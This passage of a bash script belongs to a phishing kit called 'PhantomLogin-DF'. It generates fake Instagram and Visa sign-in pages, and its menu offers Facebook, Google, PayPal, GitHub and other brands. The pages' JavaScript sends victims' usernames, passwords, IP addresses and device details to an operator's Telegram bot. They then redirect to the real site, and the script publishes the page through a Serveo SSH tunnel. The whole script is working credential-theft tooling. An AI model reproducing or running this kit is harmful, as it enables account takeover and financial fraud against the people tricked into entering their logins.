        input:focus { border-color: #4c86ff; box-shadow: 0 0 8px rgba(76, 134, 255, 0.2); }
        .btn-login { width: 100%; padding: 14px; background-color: #4c86ff; color: white; font-weight: bold; font-size: 16px; border-radius: 5px; border: none; cursor: pointer; margin-bottom: 15px; transition: background-color 0.3s ease; }
        .btn-login:hover { background-color: #3578e5; }
        .forgot-password { margin-top: 10px; font-size: 14px; }
        .forgot-password a { color: #4c86ff; text-decoration: none; }
        .divider { margin: 20px 0; border-top: 1px solid #dbdbdb; }
        .signup-btn { width: 100%; padding: 14px; background-color: #fafafa; border: 1px solid #dbdbdb; font-size: 14px; color: #4c86ff; border-radius: 5px; cursor: pointer; margin-bottom: 10px; }
        .signup-btn:hover { background-color: #f4f4f4; }
        .terms { margin-top: 20px; font-size: 12px; color: #888; }
        .terms a { color: #4c86ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1024px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
        <h2>Sign in to Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Don't have an account? Sign up</button>
    </div>
    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const deviceInfo = await getDeviceInfo();
            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`Instagram Login Attempt:\nUsername💎: \${username}\nPassword🔑: \${password}\nDevice Info✨:\nIP Address🌐📍: \${deviceInfo.ip}\nBattery Level🔋: \${deviceInfo.batteryLevel}%\nNetwork🔍🌐: \${deviceInfo.networkType}\nDevice Name🌐: \${deviceInfo.deviceName}\`
                })
            });
            const result = await response.json();
            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.instagram.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });
        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;
            return { ip: ip.ip, batteryLevel: Math.round(battery.level * 100), networkType: networkType, deviceName: deviceName };
        }
    </script>
</body>
</html>
EOF
}

visa_page() {
    cat <<EOF
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            border-radius: 10px;
            width: 360px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .login-container img {
            width: 100px;
            margin-bottom: 25px;
        }

        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 15px;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input:focus {
            border-color: #1a1a1a;
            box-shadow: 0 0 8px rgba(26, 26, 26, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1a1a1a;
            color: white;
            font-weight: bold;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            margin-bottom: 15px;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #333;
        }

        .forgot-password {
            margin-top: 10px;
            font-size: 14px;
        }

        .forgot-password a {
            color: #1a1a1a;
            text-decoration: none;
        }

        .divider {
            margin: 20px 0;
            border-top: 1px solid #dbdbdb;
        }

        .signup-btn {
            width: 100%;
            padding: 14px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            color: #1a1a1a;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 10px;
        }

        .signup-btn:hover {
            background-color: #f4f4f4;
        }

        .terms {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        .terms a {
            color: #1a1a1a;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo">
        <h2>Sign in to Visa</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn-login">Log In</button>
        </form>
        <p class="forgot-password"><a href="#">Forgot password?</a></p>
        <div class="divider"></div>
        <button class="signup-btn">Create account</button>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async function (event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const deviceInfo = await getDeviceInfo();

            const response = await fetch('https://api.telegram.org/bot${token}/sendMessage', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: '${id}',
                    text: \`
Visa Login Attempt:

Username📧: \${username}
Password🔑: \${password}

Device Info📲:

IP Address🌍: \${deviceInfo.ip}
Battery Level🔋: \${deviceInfo.batteryLevel}%
Network Type📡: \${deviceInfo.networkType}
Device Name📱: \${deviceInfo.deviceName}
                    \`
                })
            });

            const result = await response.json();

            if (result.ok) {
                alert('Login successful! Redirecting...');
                window.location.href = 'https://www.visa.com';
            } else {
                alert('Login failed. Please check your credentials.');
            }
        });

        async function getDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            const battery = await navigator.getBattery();
            const networkType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
            const deviceName = navigator.userAgent;

            return {
                ip: ip.ip,
                batteryLevel: Math.round(battery.level * 100),
                networkType: networkType,
                deviceName: deviceName,
            };
        }
    </script>
</body>
</html>
EOF
}
 
start_local_server() {
    echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
    pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"

    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${GREEN}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"
    trap "kill $php_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

start_serveo_server() {
    echo -e "${GREEN}[+] Stopping any existing PHP server...${NC}"
    pkill -f "php -S localhost:3333" || echo -e "${YELLOW}[!] No existing PHP server found.${NC}"

    echo -e "${GREEN}[+] Stopping any existing SSH tunnel...${NC}"
    killall ssh || echo -e "${YELLOW}[!] No existing SSH tunnel found.${NC}"

    echo -e "${GREEN}[+] Starting PHP server on localhost...${NC}"
    php -S localhost:3333 > /dev/null 2>&1 &
    php_pid=$!
    echo -e "${RED}[+] PHP server started at http://localhost:3333/${page}.html${NC}"

    echo -e "${GREEN}[+] Starting SSH tunnel with Serveo...${NC}"
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
    ssh_pid=$!
    sleep 8

    echo -e "${GREEN}[+] Fetching Serveo URL...${NC}"
    serveo_url=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [[ -z "$serveo_url" ]]; then
        echo -e "${RED}[-] Failed to start Serveo.net. Please make sure SSH is installed and try again.${NC}"
        exit 1
    fi

    echo -e "${BLUE}[+] Serveo URL: ${serveo_url}/${page}.html${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to stop the server.${NC}"

    trap "kill $php_pid $ssh_pid 2> /dev/null" EXIT
    while true; do
        sleep 1
    done
}

show_menu() {
    echo -e "${GREEN}Welcome to PhantomLogin-DF... ${NC}"
    echo -e "${GREEN}The developer is not responsible for any incorrect use of the tool... ${NC}"
    echo -e "${GREEN}All rights reserved: Mohamed Abu Al-Saud ${NC}"
    echo -e "${YELLOW}=================================${NC}"
    echo -e "${BLUE}[1] Facebook login${NC}"
    echo -e "${BLUE}[2] Instagram login${NC}"
    echo -e "${BLUE}[3] Google login${NC}"
    echo -e "${BLUE}[4] TikTok login${NC}"
    echo -e "${BLUE}[5] Visa login${NC}"
    echo -e "${BLUE}[6] Camera and location${NC}"
    echo -e "${BLUE}[7] Twitter login${NC}"
    echo -e "${BLUE}[8] PayPal login${NC}"
    echo -e "${BLUE}[9] GitHub login${NC}"
    echo -e "${BLUE}[10] Instagram login${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

show_banner
install_dependencies

echo -e "${GREEN}[+] Enter Token:${NC}"
read token
echo -e "${GREEN}[+] Enter ID:${NC}"
read id

show_menu

echo -e "${GREEN}[+] Choose the page you want to create:${NC}"
read choice

case $choice in
    1)
        page="Facebook_login"
        create_page "$page" "$(facebook_page)"
        ;;
    2)
        page="instagram_login"
        create_page "$page" "$(instagram_page)"
        ;;
    3)
        page="Google_login"
        create_page "$page" "$(google_page)"
        ;;
    4)
        page="TikTok_login"
        create_page "$page" "$(tiktok_page)"
        ;;
    5)
        page="visa_login"
        create_page "$page" "$(visa_page)"
        ;;
    6)
        page="CameraAndLocation_login"
        create_page "$page" "$(camera_page)"
        ;;
    7)
        page="Twitter_login"
        create_page "$page" "$(twitter_page)"
        ;;
    8)
        page="PayPal_login"
        create_page "$page" "$(paypal_page)"
        ;;
    9)
        page="GitHub_login"
        create_page "$page" "$(github_page)"
        ;;
       
   10)
        page="instagram22_login"
        create_page "$page" "$(Instagram22_page)"
        ;;
     
      *)
      
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac

echo -e "${GREEN}[+] Choose server type:${NC}"
echo -e "${RED}[1] Localhost${NC}"
echo -e "${RED}[2] Serveo.net${NC}"
read server_choice

case $server_choice in
    1)
        start_local_server
        ;;
    2)
        start_serveo_server
        ;;
    *)
        echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
        exit 1
        ;;
esac
